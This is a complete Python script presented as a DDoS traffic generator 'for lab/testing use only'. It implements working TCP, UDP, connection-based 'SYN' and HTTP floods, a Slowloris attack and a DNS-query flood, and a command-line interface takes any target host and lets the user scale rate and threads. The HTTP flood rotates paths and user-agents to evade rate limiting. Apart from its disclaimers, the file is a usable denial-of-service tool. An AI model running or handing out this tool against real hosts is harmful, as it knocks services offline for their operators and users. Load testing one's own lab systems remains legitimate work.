#!/usr/bin/env python3
"""
traffic_generator.py  –  Enhanced Traffic & Attack Simulator
Supports: TCP flood, UDP flood, SYN flood, HTTP flood, Slowloris, Amplification sim
Usage: python traffic_generator.py <target> [options]
"""

import random
import socket
import threading
import time
import argparse
import logging
import sys
from typing import Callable

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ─── Helper ──────────────────────────────────────────────────────────────────

def _rate_loop(fn: Callable, rate: int, duration: float, stop_ev: threading.Event):
    """Call fn() at <rate> times/sec for <duration> seconds."""
    end = time.time() + duration
    interval = 1.0 / max(rate, 1)
    while time.time() < end and not stop_ev.is_set():
        t0 = time.time()
        fn()
        elapsed = time.time() - t0
        sleep = interval - elapsed
        if sleep > 0:
            time.sleep(sleep)

# ─── Attack Functions ─────────────────────────────────────────────────────────

def generate_normal_traffic(target_ip, target_port, duration, rate, stop_ev):
    """Simulated legitimate HTTP GET traffic."""
    count = 0
    def _req():
        nonlocal count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((target_ip, target_port))
            req = (f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
                   f"User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n")
            s.send(req.encode())
            s.recv(512)
            s.close()
            count += 1
        except Exception:
            pass
    _rate_loop(_req, rate, duration, stop_ev)
    logging.info(f"Normal traffic done — {count} requests")


def tcp_flood(target_ip, target_port, duration, rate, stop_ev):
    """High-rate raw TCP connections with random payload."""
    payload = random._urandom(1024)
    count = 0
    def _conn():
        nonlocal count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.send(payload)
            s.close()
            count += 1
        except Exception:
            pass
    _rate_loop(_conn, rate, duration, stop_ev)
    logging.info(f"TCP flood done — {count} connections")


def udp_flood(target_ip, target_port, duration, rate, stop_ev):
    """UDP datagram flood — no connection overhead."""
    payload = random._urandom(512)
    count = 0
    def _send():
        nonlocal count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (target_ip, target_port))
            s.close()
            count += 1
        except Exception:
            pass
    _rate_loop(_send, rate, duration, stop_ev)
    logging.info(f"UDP flood done — {count} datagrams")


def syn_flood(target_ip, target_port, duration, rate, stop_ev):
    """
    SYN flood simulation — connects and closes immediately
    without completing the handshake.
    """
    count = 0
    def _syn():
        nonlocal count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((target_ip, target_port))
            s.close()
            count += 1
        except Exception:
            pass
    _rate_loop(_syn, rate, duration, stop_ev)
    logging.info(f"SYN flood done — {count} half-opens")


def http_flood(target_ip, target_port, duration, rate, stop_ev):
    """
    HTTP GET/POST flood with randomised paths and user-agents
    to evade simple rate limiting.
    """
    paths = ["/", "/index.html", "/api/data", "/search?q=" + "x"*20,
             "/login", "/static/app.js", "/favicon.ico",
             "/api/v1/users", "/admin", "/wp-login.php"]
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "curl/7.68.0",
        "python-requests/2.28",
        "Go-http-client/1.1",
    ]
    count = 0
    def _req():
        nonlocal count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            path  = random.choice(paths)
            agent = random.choice(agents)
            req = (f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\n"
                   f"User-Agent: {agent}\r\nAccept: */*\r\n\r\n")
            s.send(req.encode())
            s.close()
            count += 1
        except Exception:
            pass
    _rate_loop(_req, rate, duration, stop_ev)
    logging.info(f"HTTP flood done — {count} requests")


def slowloris(target_ip, target_port, duration, connections, stop_ev):
    """
    Slowloris — open many connections and send partial HTTP headers
    very slowly, keeping them alive without completing the request.
    """
    sockets = []

    def _open_conn():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            sockets.append(s)
        except Exception:
            pass

    # Open initial connections
    logging.info(f"Slowloris: opening {connections} connections...")
    for _ in range(connections):
        if stop_ev.is_set():
            break
        _open_conn()
        time.sleep(0.05)

    logging.info(f"Slowloris: {len(sockets)} connections open, dripping headers...")
    end = time.time() + duration
    while time.time() < end and not stop_ev.is_set():
        # Send a partial header to keep connection alive
        dead = []
        for s in sockets:
            try:
                s.send(f"X-Keep: {random.randint(1,9999)}\r\n".encode())
            except Exception:
                dead.append(s)

        # Remove dead sockets
        for s in dead:
            sockets.remove(s)

        # Refill
        while len(sockets) < connections and not stop_ev.is_set():
            _open_conn()

        time.sleep(5)

    for s in sockets:
        try: s.close()
        except Exception: pass

    logging.info(f"Slowloris done — held {connections} connections")


def amplification_sim(target_ip, target_port, duration, rate, stop_ev):
    """
    Amplification simulation — small UDP packets to DNS/NTP ports.
    Educational simulation only; does NOT spoof source addresses.
    """
    # DNS-style tiny payload
    dns_query = bytes([
        0x00,0x01,  # transaction ID
        0x01,0x00,  # flags: standard query
        0x00,0x01,  # questions: 1
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x03,0x77,0x77,0x77,  # www
        0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,  # google
        0x03,0x63,0x6f,0x6d,0x00,  # com
        0x00,0x01,0x00,0x01  # type A, class IN
    ])
    count = 0
    def _send():
        nonlocal count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(dns_query, (target_ip, target_port))
            s.close()
            count += 1
        except Exception:
            pass
    _rate_loop(_send, rate, duration, stop_ev)
    logging.info(f"Amplification sim done — {count} packets")

# ─── Main ────────────────────────────────────────────────────────────────────

ATTACK_MAP = {
    "normal":        generate_normal_traffic,
    "tcp":           tcp_flood,
    "udp":           udp_flood,
    "syn":           syn_flood,
    "http":          http_flood,
    "slowloris":     None,          # handled separately (different signature)
    "amplification": amplification_sim,
}

def main():
    parser = argparse.ArgumentParser(
        description="Enhanced DDoS Traffic Generator  |  For lab/testing use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack types:
  normal        Legitimate HTTP traffic (baseline)
  tcp           TCP connection flood
  udp           UDP datagram flood
  syn           SYN flood simulation
  http          HTTP GET/POST flood with random paths & agents
  slowloris     Slow HTTP header attack (keeps connections open)
  amplification DNS/NTP amplification simulation (UDP small packets)

Examples:
  python traffic_generator.py 127.0.0.1 --type tcp --rate 200 --threads 4
  python traffic_generator.py 127.0.0.1 --type http --port 8080 --duration 60
  python traffic_generator.py 127.0.0.1 --type slowloris --connections 200
        """
    )
    parser.add_argument("target",       help="Target IP or hostname")
    parser.add_argument("--port",       type=int, default=80)
    parser.add_argument("--type",       choices=list(ATTACK_MAP.keys()), default="normal")
    parser.add_argument("--duration",   type=int, default=30, help="Seconds (default 30)")
    parser.add_argument("--rate",       type=int, default=10,  help="Connections/s per thread")
    parser.add_argument("--threads",    type=int, default=1)
    parser.add_argument("--connections",type=int, default=100, help="Slowloris: open connections")
    args = parser.parse_args()

    try:
        target_ip = socket.gethostbyname(args.target)
    except socket.error:
        logging.error(f"Cannot resolve: {args.target}")
        sys.exit(1)

    print(f"\n{'='*55}")
    print(f"  DDoS Traffic Generator  |  Educational Use Only")
    print(f"{'='*55}")
    print(f"  Target  : {target_ip}:{args.port}")
    print(f"  Type    : {args.type}")
    print(f"  Duration: {args.duration}s")
    if args.type == "slowloris":
        print(f"  Conns   : {args.connections}")
    else:
        print(f"  Rate    : {args.rate} conn/s × {args.threads} threads")
    print(f"{'='*55}\n")
    print("  Press Ctrl+C to stop early.\n")

    stop_ev = threading.Event()
    try:
        if args.type == "slowloris":
            slowloris(target_ip, args.port, args.duration,
                      args.connections, stop_ev)
        else:
            fn = ATTACK_MAP[args.type]
            threads = []
            rate_per_thread = max(1, args.rate // args.threads)
            for _ in range(args.threads):
                t = threading.Thread(
                    target=fn,
                    args=(target_ip, args.port, args.duration,
                          rate_per_thread, stop_ev),
                    daemon=True
                )
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
    except KeyboardInterrupt:
        stop_ev.set()
        print("\n  Stopped by user.")

    print("\n  Traffic generation complete.\n")

if __name__ == "__main__":
    main()
